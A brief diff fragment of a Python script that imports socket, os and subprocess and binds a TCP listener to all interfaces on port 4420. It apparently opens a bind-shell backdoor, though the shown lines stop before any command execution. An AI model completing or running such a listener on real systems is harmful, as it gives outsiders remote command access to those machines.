@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+import socket,os,subprocess
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 c.bind(('0.0.0.0', 4420))
 c.listen(1)
